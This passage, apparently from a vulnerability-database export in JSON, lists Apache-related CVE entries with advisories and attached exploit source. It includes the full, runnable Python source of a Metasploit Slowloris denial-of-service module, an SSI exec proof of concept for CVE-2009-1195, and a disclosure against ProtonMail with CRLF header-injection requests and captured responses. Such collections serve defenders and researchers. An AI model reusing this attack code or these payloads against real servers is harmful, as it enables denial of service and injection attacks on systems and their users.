\n//Clean up the connection  \nvoid cleanUp()  \n{  \nclosesocket(sock);  \nWSACleanup();  \n}  \n`\n",
            "cvss": {
                "score": 10.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:COMPLETE/I:COMPLETE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:86964"
        }
    ],
    "CVE-2010-0434": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 38580\r\nCVE(CAN) ID: CVE-2010-0434\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\n\u5728\u4f7f\u7528\u591a\u7ebf\u7a0bMPM\u65f6\uff0cApache HTTP Server\u7684server/protocol.c\u6587\u4ef6\u4e2d\u7684ap_read_request\u51fd\u6570\u6ca1\u6709\u6b63\u786e\u5730\u5904\u7406\u5b50\u8bf7\u6c42\uff0c\u53ef\u80fd\u5141\u8bb8\u8fdc\u7a0b\u653b\u51fb\u8005\u4ece\u5176\u4ed6\u7ebf\u7a0b\u6240\u5904\u7406\u7684\u8bf7\u6c42\u4e2d\u8bfb\u53d6\u654f\u611f\u4fe1\u606f\u3002\n\nApache Group Apache 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://svn.apache.org/viewvc?view=revision&amp;revision=918427\r\nhttp://svn.apache.org/viewvc?view=revision&amp;revision=917867",
            "modified": "2010-03-23T00:00:00",
            "published": "2010-03-23T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-19320",
            "id": "SSV:19320",
            "title": "Apache 2.2.x\u5b50\u8bf7\u6c42\u5904\u7406\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 4.3,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:NONE/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:19320"
        }
    ],
    "CVE-2013-5704": [
        {
            "bulletinFamily": "exploit",
            "description": "Bugtraq ID:66550\r\nCVE ID:CVE-2013-5704\r\n\r\nModSecurity\u662fWeb\u5e94\u7528\u670d\u52a1\u5668\u3002\r\n\r\nModSecurity\u5728\u5b9e\u73b0\u4e0a\u5b58\u5728\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e\uff0c\u6210\u529f\u5229\u7528\u540e\u53ef\u4f7f\u653b\u51fb\u8005\u7ed5\u8fc7\u8fc7\u6ee4\u89c4\u5219\u3002\n0\nmodsecurity\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u6f0f\u6d1e\uff0c\u8bf7\u4e0b\u8f7d\u4f7f\u7528\uff1a\r\nhttp://sourceforge.net/projects/mod-security/",
            "modified": "2014-04-04T00:00:00",
            "published": "2014-04-04T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-62058",
            "id": "SSV:62058",
            "title": "ModSecurity 'mod_headers'\u6a21\u5757\u5b89\u5168\u9650\u5236\u7ed5\u8fc7\u6f0f\u6d1e",
            "type": "seebug",
            "sourceData": "",
            "cvss": {
                "score": 5.0,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:NONE/I:PARTIAL/A:NONE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:62058"
        }
    ],
    "CVE-2007-6750": [
        {
            "bulletinFamily": "exploit",
            "description": "Slowloris tries to keep many connections to the target web server open and hold them open as long as possible. It accomplishes this by opening connections to the target web server and sending a partial request. Periodically, it will send subsequent HTTP headers, adding to-but never completing-the request. Affected servers will keep these connections open, filling their maximum concurrent connection pool, eventually denying additional connection attempts from clients.\n",
            "modified": "2018-08-28T11:49:31",
            "published": "2017-11-21T21:21:01",
            "id": "MSF:AUXILIARY/DOS/HTTP/SLOWLORIS",
            "href": "",
            "type": "metasploit",
            "title": "Slowloris Denial of Service Attack",
            "sourceData": "#!/usr/bin/env python\n# Note, works with both python 2.7 and 3\n\nimport random\nimport socket\nimport ssl\nimport string\nimport time\n\nfrom metasploit import module\n\nmetadata = {\n    'name': 'Slowloris Denial of Service Attack',\n    'description': '''\n        Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.\n        It accomplishes this by opening connections to the target web server and sending a partial request.\n        Periodically, it will send subsequent HTTP headers, adding to-but never completing-the request.\n        Affected servers will keep these connections open, filling their maximum concurrent connection pool,\n        eventually denying additional connection attempts from clients.\n     ''',\n    'authors': [\n        'RSnake',  # Vulnerability disclosure\n        'Gokberk Yaltirakli',  # Simple slowloris in Python\n        'Daniel Teixeira',  # Metasploit module (Ruby)\n        'Matthew Kienow <matthew_kienow[AT]rapid7.com>'  # Metasploit external module (Python)\n    ],\n    'date': '2009-06-17',\n    'references': [\n        {'type': 'cve', 'ref': '2007-6750'},\n        {'type': 'cve', 'ref': '2010-2227'},\n        {'type': 'edb', 'ref': '8976'},\n        {'type': 'url', 'ref': 'https://github.com/gkbrk/slowloris'}\n     ],\n    'type': 'dos',\n    'options': {\n        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},\n        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},\n        'sockets': {'type': 'int', 'description': 'The number of sockets to use in the attack', 'required': True, 'default': 150},\n        'delay': {'type': 'int', 'description': 'The delay between sending keep-alive headers', 'required': True, 'default': 15},\n        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False},\n        'rand_user_agent': {'type': 'bool', 'description': 'Randomizes user-agent with each request', 'required': True, 'default': True}\n     }}\n\nlist_of_sockets = []\nuser_agents = [\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14\",\n    \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\"\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0\",\n    \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0\",\n    \"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\",\n    \"Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0\",\n    \"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\",\n    \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0\",\n]\n\n\ndef create_random_header_name(size=8, seq=string.ascii_uppercase + string.ascii_lowercase):\n    return ''.join(random.choice(seq) for _ in range(size))\n\n\ndef init_socket(host, port, use_ssl=False, rand_user_agent=True):\n    s = socket.create_connection((host, port), 10)\n    s.settimeout(4)\n\n    if use_ssl:\n        s = ssl.wrap_socket(s)\n\n    s.send(\"GET /?{} HTTP/1.1\\r\\n\".format(random.randint(0, 2000)).encode(\"utf-8\"))\n\n    if rand_user_agent:\n        s.send(\"User-Agent: {}\\r\\n\".format(random.choice(user_agents)).encode(\"utf-8\"))\n    else:\n        s.send(\"User-Agent: {}\\r\\n\".format(user_agents[0]).encode(\"utf-8\"))\n\n    s.send(\"{}\\r\\n\".format(\"Accept-language: en-US,en,q=0.5\").encode(\"utf-8\"))\n    return s\n\n\ndef run(args):\n    host = args['rhost']\n    port = int(args['rport'])\n    use_ssl = args['ssl'] == \"true\"\n    rand_user_agent = args['rand_user_agent'] == \"true\"\n    socket_count = int(args['sockets'])\n    delay = int(args['delay'])\n\n    module.log(\"Attacking %s with %s sockets\" % (host, socket_count), 'info')\n\n    module.log(\"Creating sockets...\", 'info')\n    for i in range(socket_count):\n        try:\n            module.log(\"Creating socket number %s\" % i, 'debug')\n            s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)\n        except socket.error:\n            break\n        list_of_sockets.append(s)\n\n    while True:\n        module.log(\"Sending keep-alive headers... Socket count: %s\" % len(list_of_sockets), 'info')\n        for s in list(list_of_sockets):\n            try:\n                s.send(\"{}: {}\\r\\n\".format(create_random_header_name(random.randint(8, 16)),\n                                           random.randint(1, 5000)).encode(\"utf-8\"))\n\n            except socket.error:\n                list_of_sockets.remove(s)\n\n        for _ in range(socket_count - len(list_of_sockets)):\n            module.log(\"Recreating socket...\", 'debug')\n            try:\n                s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)\n                if s:\n                    list_of_sockets.append(s)\n            except socket.error:\n                break\n        time.sleep(delay)\n\n\nif __name__ == \"__main__\":\n    module.run(metadata, run)\n",
            "cvss": {
                "score": 6.4,
                "vector": "AV:N/AC:L/Au:N/C:P/I:N/A:P"
            },
            "vhref": "https://vulners.com/metasploit/MSF:AUXILIARY/DOS/HTTP/SLOWLORIS"
        }
    ],
    "CVE-2009-1890": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 35565\r\nCVE(CAN) ID: CVE-2009-1890\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\n\u5982\u679c\u914d\u7f6e\u4e86\u53cd\u5411\u4ee3\u7406\u7684\u8bdd\uff0c\u5728Apache HTTP Server\u7684mod_proxy\u6a21\u5757\u4e2d\uff0cmod_proxy_http.c\u7684stream_reqbody_cl\u51fd\u6570\u6ca1\u6709\u6b63\u786e\u5730\u5904\u7406\u6570\u91cf\u8d85\u8fc7\u4e86 Content-Length\u503c\u7684\u6d41\u6570\u636e\u3002\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u5411\u53d7\u5f71\u54cd\u7684\u4ee3\u7406\u8fdb\u7a0b\u53d1\u9001\u7279\u5236\u7684\u8bf7\u6c42\u5bfc\u81f4\u8017\u5c3d\u5927\u91cf\u7684CPU\u8d44\u6e90\u3002\n\nApache 2.2.x\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\nhttp://svn.apache.org/viewvc/httpd/httpd/trunk/CHANGES?r1=790587&amp;r2=790586&amp;pathrev=790587",
            "modified": "2009-07-07T00:00:00",
            "published": "2009-07-07T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-11762",
            "id": "SSV:11762",
            "type": "seebug",
            "title": "Apache mod_proxy\u53cd\u5411\u4ee3\u7406\u62d2\u7edd\u670d\u52a1\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 7.1,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:11762"
        }
    ],
    "CVE-2009-1195": [
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 35115\r\nCVE(CAN) ID: CVE-2009-1195\r\n\r\nApache HTTP Server\u662f\u4e00\u6b3e\u6d41\u884c\u7684Web\u670d\u52a1\u5668\u3002\r\n\r\nApache HTTP Server\u6ca1\u6709\u6b63\u786e\u5730\u5904\u7406AllowOverride\u6307\u4ee4\u4e2d\u7684Options=IncludesNOEXEC\u9009\u9879\uff0c\u672c\u5730\u7528\u6237\u53ef\u4ee5\u901a\u8fc7\u5728.htaccess\u6587\u4ef6\u4e2d\u914d\u7f6e(1) Options Includes\u3001(2) Options +Includes\u6216(3) Options +IncludesNOEXEC\u5e76\u5728.shtml\u6587\u4ef6\u4e2d\u6ce8\u5165exec\u5143\u7d20\u5bfc\u81f4\u7ed5\u8fc7\u5b89\u5168\u9650\u5236\u83b7\u5f97\u6743\u9650\u3002\n\nApache 2.2.x\n \u5382\u5546\u8865\u4e01\uff1a\r\n\r\nApache Group\r\n------------\r\n\u76ee\u524d\u5382\u5546\u5df2\u7ecf\u53d1\u5e03\u4e86\u5347\u7ea7\u8865\u4e01\u4ee5\u4fee\u590d\u8fd9\u4e2a\u5b89\u5168\u95ee\u9898\uff0c\u8bf7\u5230\u5382\u5546\u7684\u4e3b\u9875\u4e0b\u8f7d\uff1a\r\n\r\n<a href=\"http://svn.apache.org/viewvc?view=rev&amp;revision=652885\" target=\"_blank\" rel=external nofollow>http://svn.apache.org/viewvc?view=rev&amp;revision=652885</a>\r\n\r\nRedHat\r\n------\r\nRedHat\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08RHSA-2009:1075-01\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nRHSA-2009:1075-01\uff1aModerate: httpd security update\r\n\u94fe\u63a5\uff1a<a href=\"https://www.redhat.com/support/errata/RHSA-2009-1075.html\" target=\"_blank\" rel=external nofollow>https://www.redhat.com/support/errata/RHSA-2009-1075.html</a>",
            "modified": "2009-06-22T00:00:00",
            "published": "2009-06-22T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-11668",
            "id": "SSV:11668",
            "type": "seebug",
            "title": "Apache HTTP Server AllowOverride\u9009\u9879\u7ed5\u8fc7\u5b89\u5168\u9650\u5236\u6f0f\u6d1e",
            "sourceData": "\n                                                \u5411httpd.conf\u4e2d\u6dfb\u52a0\uff1a\r\n\r\n&lt;Directory &quot;/var/www/html/test&quot;&gt;\r\nOptions None\r\nAllowOverride Options=IncludesNoEXEC\r\n&lt;/Directory\r\n\r\n\u5728/var/www/html/test\u4e2d\u521b\u5efa\u4ee5\u4e0b\u4e24\u4e2a\u6587\u4ef6\uff1a\r\n\r\nindex.shtml:\r\n&lt;html&gt;\r\n&lt;body&gt;\r\n&lt;p&gt;\r\nThis document last modified &lt;!--#flastmod file=&quot;front.shtml&quot; --&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;Start include:&lt;/p&gt;\r\n&lt;!--#include virtual=&quot;/test/test.shtml&quot; --&gt;\r\n&lt;p&gt;End include&lt;/p&gt;\r\n&lt;/body&gt;&lt;/html&gt;\r\n\r\ntest.shtml:\r\n&lt;html&gt;\r\n&lt;body&gt;\r\n&lt;p&gt;start&lt;/p&gt;\r\n&lt;pre&gt;\r\n&lt;!--#exec cmd=&quot;pwd&quot; --&gt;\r\n&lt;/pre&gt;\r\n&lt;p&gt;end&lt;/p&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n\n                              ",
            "cvss": {
                "score": 4.9,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:11668"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Bugraq ID: 35115\r\nCVE ID\uff1aCVE-2009-1195\r\nCNCVE ID\uff1aCNCVE-20091195\r\n\r\nApache\u662f\u4e00\u6b3e\u5f00\u653e\u6e90\u4ee3\u7801\u7684WEB\u670d\u52a1\u7a0b\u5e8f\u3002\r\nApache\u5728\u5904\u7406&quot;.htaccess&quot;\u6587\u4ef6\u4e2d\u7684&quot;AllowOverride&quot;\u548c\u90e8\u5206&quot;options&quot;\u53c2\u6570\u5b58\u5728\u9519\u8bef\uff0c\u53ef\u5bfc\u81f4\u901a\u8fc7SSI\u6267\u884c\u547d\u4ee4\u3002\r\n\u5982\u4e0b\u7684\u914d\u7f6e\u5b58\u5728\u5b89\u5168\u95ee\u9898\uff1a\r\na) \u5982\u679c&quot;AllowOverride Options=IncludesNoEXEC&quot;\u914d\u7f6e\u5728httpd.conf\u4e2d\uff0c\u7528\u6237\u53ef\u4ee5\u5728.htaccess\u6587\u4ef6\u4e2d\u8bbe\u7f6e&quot;Options Includes&quot;\uff0cSSI\u5c06\u4f1a\u4ee5exec=\u5141\u8bb8\u65b9\u5f0f\u542f\u7528\u3002\r\nb)\u5982\u679c&quot;AllowOverride Options=IncludesNoEXEC&quot;\u914d\u7f6e\u5728httpd.conf\u4e2d\uff0c&quot;Options IncludesNoExec&quot;\u5728\u76f8\u540c&lt;Directory&gt;\u4e0a\u4e0b\u6587\u542f\u7528\uff0c\u5728.htaccess\u6587\u4ef6\u4e2d\u8bbe\u7f6e&quot;Options +IncludesNoExec&quot;\u53ef\u5bfc\u81f4SSI\u5c06\u4f1a\u4ee5exec=\u5141\u8bb8\u65b9\u5f0f\u542f\u7528\u3002\n\nRedHat Enterprise Linux Desktop Workstation 5 client\r\nRedHat Enterprise Linux Desktop 5 client\r\nRedHat Enterprise Linux 5 server\r\nApache Software Foundation Apache 2.2.8\r\nApache Software Foundation Apache 2.2.6\r\nApache Software Foundation Apache 2.2.5\r\nApache Software Foundation Apache 2.2.4\r\nApache Software Foundation Apache 2.2.3\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.2\r\nApache Software Foundation Apache 2.2.1\r\nApache Software Foundation Apache 2.2\n \u5382\u5546\u89e3\u51b3\u65b9\u6848\r\n\u53ef\u53c2\u8003\u5982\u4e0b\u5b89\u5168\u516c\u544a\u83b7\u5f97\u8865\u4e01\u4fe1\u606f\uff1a\r\n<a href=\"http://www.apache.org/dist/httpd/CHANGES_2.2\" target=\"_blank\" rel=external nofollow>http://www.apache.org/dist/httpd/CHANGES_2.2</a>",
            "modified": "2009-06-02T00:00:00",
            "published": "2009-06-02T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-11501",
            "id": "SSV:11501",
            "type": "seebug",
            "title": "Apache HTTP Server &quot;AllowOverride&quot;\u548c&quot;Options&quot;\u5b89\u5168\u7ed5\u8fc7\u6f0f\u6d1e",
            "sourceData": "",
            "cvss": {
                "score": 4.9,
                "vector": "AV:LOCAL/AC:LOW/Au:NONE/C:NONE/I:NONE/A:COMPLETE/"
            },
            "vhref": "https://vulners.com/seebug/SSV:11501"
        }
    ],
    "CVE-2008-2939": [
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2014-05-30T00:00:00",
            "published": "2014-05-30T00:00:00",
            "href": "https://packetstormsecurity.com/files/126851/ProtonMail.ch-Header-Injection-CSRF.html",
            "id": "PACKETSTORM:126851",
            "type": "packetstorm",
            "title": "ProtonMail.ch Header Injection / CSRF",
            "sourceData": "`SecurityAdvisory  \n----------------  \n  \n  \nTime Line Vulnerability  \n-------------------------------  \n  \n  \n-Day 05-05-2014 Security Advisory => No response  \n  \n  \n-Days 08 12 19-05-2014 Multiples Advisories => No Response  \n  \n  \n-Day 20-05-2014 Full Disclosure  \n  \n  \n  \nAlerts summary  \n********************  \n  \n  \n-CRLF injection/HTTP response splitting  \n  \n/crypt/cryptographp.php  \ncfg  \n  \n  \n-Apache 2.x version older than 2.2.6  \nWeb Server  \n  \n  \n-Apache 2.x version older than 2.2.8  \nWeb Server  \n  \n  \n-Apache 2.x version older than 2.2.9  \nWeb Server  \n  \n  \n-Apache httpd remote denial of service  \nWeb Server  \n  \n  \n-HTML form without CSRF protection  \n  \n/blog  \n/blog/transparency-report  \n/blog/wp-login.php  \n/blog/wp-login.php (cac6435f6386a7a635b3f12aeb81195e)  \n/crypt  \n/lander  \n/login.php  \n/report_bug.php  \n/sign_up.php  \n  \n  \n  \n-Apache 2.x version older than 2.2.10  \n  \nWeb Server  \n  \n  \n-Clickjacking: X-Frame-Options header missing  \n  \nWeb Server  \n  \n  \n-Sensitive page could be cached  \n  \n/sign_up.php (a18aae949b9855b60506dc83164afe7f)  \n  \n  \n  \n-Session Cookie without HttpOnly flag set  \n/  \n  \n  \n  \n-TRACE method is enabled  \n  \nWeb Server  \n  \n  \n  \n-Broken links  \n  \n/css/bootstrap.css  \n/css/bs.css  \n/pages/contact_us.php  \n/pages/mit_license.php  \nPassword type input with autocomplete enabled  \n/blog/wp-login.php  \n  \n  \n  \n  \nI. VULNERABILITY  \n-------------------------  \n  \n  \nThe ASAP-Sec Penetration Testers just explain faults exposed in the title  \n  \n  \n#Title: ProtonMail.ch suffers from a CRLF injection-HTTP response   \nsplitting / Apache 2.x version older than 2.2.6 -X.8 -X.9.- 2.2.10 /   \nhttpd RemoteDoS / CSRF  \n  \n  \n#Vendor:https://protonmail.ch:443/  \n  \n  \n#Author:Juan Carlos Garc\u00eda and Francisco Moraga  \n  \n  \n#Follow us : http://www.highsec.es ||| Twitter:@secnight / @btshell1  \n  \n  \n  \n  \n  \nII. DESCRIPTION  \n-------------------------  \n  \n  \n-ProtonMail is incorporated in Switzerland and their servers are located   \nin Switzerland.  \n  \n  \n-They are outside of US and EU jurisdiction and all user data is   \nprotected by strict Swiss privacy laws.  \n  \nBecause of our end-to-end encryption, They think that :  \n  \n\"Your data is already secure and encrypted by the time it reaches our   \nservers. We have no access to your messages, and since we cannot decrypt   \nthem, we cannot share them with third parties\".  \n  \n  \n-ProtonMail's segregated authentication and decryption system means   \nlogging into a ProtonMail account that requires two passwords.  \n  \n  \n-The first password is used to authenticate the user and retrieve the   \ncorrect account. After that, encrypted data is sent to the user.  \n  \n  \n-The second password is a decryption password which is never sent to us.   \nIt is used to decrypt the user\u0092s data in the browser so we never have   \naccess to the decrypted data  \n  \nor the decryption password.  \n  \n  \n-For this reason, we are also unable to do password recovery.  \n  \n  \n-If you forget your decryption password, we cannot recover your data.  \n  \n  \n  \n  \nBy theWay, ASAP-SEC are Verifiying this information... Let's go to the   \nbusiness ;)  \n  \n  \n  \n  \n  \nIII- Vulnerabilities  \n---------------------  \n  \n  \nCRLF injection / HTTP response splitting  \n****************************************  \n  \n  \nThis script is possibly vulnerable to CRLF injection attacks.  \n  \nHTTP headers have the structure \"Key:  \n  \nValue\", where each line is separated by the CRLF combination.  \n  \nIf the user input is injected into the value section without properly   \nescaping/removing  \n  \nCRLF characters it is possible to alter the HTTP headers structure.  \n  \nHTTP Response Splitting is a \"new\" application attack technique which   \nenables  \n  \nvarious new attacks such as web cache poisoning,cross user defacement,  \n  \nhijacking pages with sensitive user information and cross-site scripting   \n(XSS).  \n  \n  \nThe attacker sends a single HTTP request that forces the web server to   \nform an output stream,  \n  \nwhich is then interpreted by the target as two HTTP responses instead of   \none response.  \n  \n  \nAffected items  \n------------------  \n  \n/crypt/cryptographp.php  \n  \n  \n  \nThe impact of this vulnerability  \n----------------------------------  \n  \nIs it possible for a remote attacker to inject custom HTTP headers.  \n  \nFor example, an attacker can inject session cookies or HTML code.  \n  \nThis may conduct to vulnerabilities like XSS (cross-site scripting) or   \nsession fixation.  \n  \n  \n  \n  \nHow to fix this vulnerability  \n------------------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10)  \n  \n  \nFrom  \n  \nthe user input  \n  \nor  \n  \nproperly encode the output  \n  \nin  \n  \norder to prevent the injection  \n  \nof  \n  \ncustom HTTP headers.  \n  \n  \n  \n  \nAttack details  \n--------------------  \n  \nURL encoded GET input cfg was set to   \n<SomeCustomInjectedHeader:injected_by_secnight  \n  \n  \n  \nInjected header found:  \n  \nSomeCustomInjectedHeader: injected_by_secnight  \n  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_secnight  \n  \n  \n  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_secnight&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \nHow to fix this vulnerability  \n-----------------------------  \n  \n  \nYou need to restrict CR(0x13) and LF(0x10) from the user  \n  \ninput or properly encode the output in order to prevent  \n  \nthe injection of custom HTTP headers.  \n  \n  \n  \n  \n  \nVariant 1  \n-----------  \n  \n  \nGET   \n/crypt/cryptographp.php?cfg=%0d%0a%20SomeCustomInjectedHeader%3ainjected_by_asapsec   \nHTTP/1.1  \n  \nReferer: https://protonmail.ch:443/  \n  \nCookie: PHPSESSID=afaj9rt84m3oevgtld6thfe9l4; cryptcookietest=1  \n  \nHost: protonmail.ch  \n  \nConnection: Keep-alive  \n  \n  \nResponse  \n----------  \n  \n  \nHTTP/1.0 302 Found  \n  \nDate: Wed, 28 May 2014 15:33:55 GMT  \n  \nServer: Apache/2.2.3 (CentOS)  \n  \nX-Powered-By: PHP/5.3.28  \n  \nExpires: Thu, 19 Nov 1981 08:52:00 GMT  \n  \nCache-Control: no-store, no-cache, must-revalidate, post-check=0,   \npre-check=0  \n  \nPragma: no-cache  \n  \nSet-Cookie: cryptcookietest=1  \n  \nLocation: cryptographp.inc.php?cfg=  \n  \nSomeCustomInjectedHeader: injected_by_wvs&sn=PHPSESSID&  \n  \nStrict-Transport-Security: max-age=15768000;includeSubDomains  \n  \nContent-Length: 0  \n  \nConnection: close  \n  \nContent-Type: text/html  \n  \n  \n  \n  \n  \n  \nApache 2.x version older than 2.2.10  \n**************************************  \n  \n  \nFixed in Apache httpd 2.2.10: mod_proxy_ftp globbing XSS CVE-2008-2939  \n  \nA flaw was found in the handling of wildcards in the path of a FTP URL   \nwith mod_proxy_ftp.  \n  \nIf mod_proxy_ftp is enabled to support FTP-over-HTTP, requests   \ncontaining globbing characters could lead to cross-site scripting (XSS)   \nattacks.  \n  \nAffected Apache versions (2.2.9, 2.2.8, 2.2.6, 2.2.5, 2.2.4, 2.2.3,   \n2.2.2, 2.2.0).  \n  \n  \n  \n  \nApache httpd remote denial of service  \n*************************************  \n  \n  \nVulnerability description  \n------------------------------  \n  \n  \nA denial of service vulnerability has been found in the way the multiple  \n  \noverlapping ranges are handled by the Apache HTTPD server:  \n  \n  \n  \n  \nhttp://seclists.org/fulldisclosure/2011/Aug/175  \n  \n  \n  \nAn attack tool is circulating in the wild. Active use of this tools has   \nbeen observed. The attack can be done remotely  \n  